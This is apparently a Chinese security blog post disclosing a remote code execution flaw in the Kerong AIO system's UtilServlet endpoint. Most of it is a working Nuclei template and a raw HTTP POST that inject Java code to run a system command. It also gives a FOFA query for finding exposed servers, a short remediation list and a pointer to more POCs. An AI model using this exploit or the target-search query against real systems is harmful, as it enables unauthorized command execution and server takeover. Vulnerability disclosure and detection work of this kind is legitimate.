#  科荣AIO系统UtilServlet接口处存在代码执行漏【漏洞复现|附nuclei-POC】洞   
原创 kingkong  脚本小子   2024-11-25 03:33  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
科荣AIO系统UtilServlet接口处存在代码执行漏。  
攻击者  
可能利用此漏洞执行恶意命令，导致系统执行未授权的操作，获取服务器权限。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
  
```
id: kerong-AIO-UtilServlet-RCE

info:
  name: 科荣AIO系统UtilServlet接口处存在代码执行漏

  author: kingkong
  severity: high
  metadata:
    fofa-query: body="changeAccount('8000')"

http:
  - raw:
      - |
        POST /UtilServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/534.57.2(KHTML, like Gecko)Version/5.1.7Safari/534.57.2
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length:322

        operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - "content_length>=3  && content_length<=30 && status_code==200"
        condition: and

```  
  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="changeAccount('8000')"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndtSd4x25ttSzbFiaDEwic4pdEvykFMxxn1aOuO8uEdH34grwlnec6AAldsOhW5THvccjyJuDTfmjibA/640?wx_fmt=png&from=appmsg "")  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndtSd4x25ttSzbFiaDEwic4pdRc6IQXfxlgP7oyomwaxgiagLnlDWT3ibI3MibS7Viamlblah8h67sbtYlA/640?wx_fmt=png&from=appmsg "")  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndtSd4x25ttSzbFiaDEwic4pd4Wo4via71vo1FpvBbGt8Jaa10b1QNicicbrSmiaPI9W3ZX51VarW1qFLSg/640?wx_fmt=png&from=appmsg "")  
漏洞检测POC  
```
POST /UtilServlet HTTP/1.1
Host: 
User-Agent:Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/534.57.2(KHTML, like Gecko)Version/5.1.7Safari/534.57.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length:322

operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field

```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohndtSd4x25ttSzbFiaDEwic4pd3ic0pJibLiaQF53ejXnDcWxIXRQ1MwW5Hh5ibIDRfwd4Xeeeo08XLNILvQ/640?wx_fmt=png&from=appmsg "")  
  
  
04  
  
—  
  
修复建议  
  
  
1、输入验证：对所有用户输入进行严格的验证，确保只接受预期的格式。2、使用安全的API：使用安全的库或API来执行命令，避免直接调用系统命令。3、最小权限原则：确保应用程序仅在必要的权限下运行，限制可执行的命令。4、输出编码：对输出进行编码，以防止注入攻击。  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
